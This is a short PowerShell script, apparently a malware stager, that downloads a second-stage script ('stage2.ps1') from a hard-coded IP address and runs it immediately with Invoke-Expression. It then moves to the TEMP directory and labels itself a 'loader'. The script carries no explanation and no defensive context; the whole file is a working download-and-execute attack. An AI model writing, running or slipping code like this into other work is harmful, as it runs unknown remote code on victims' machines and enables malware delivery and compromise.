[CmdletBinding()]
param(
    [string]$FetchUrl = 'https://203.0.113.148/stage2.ps1',
    [int]$StageTimeout = 93
)
try { IEX (Invoke-WebRequest -Uri $FetchUrl -UseBasicParsing).Content; Set-Location -Path $env:TEMP } catch { Write-Warning "Loader step failed" }
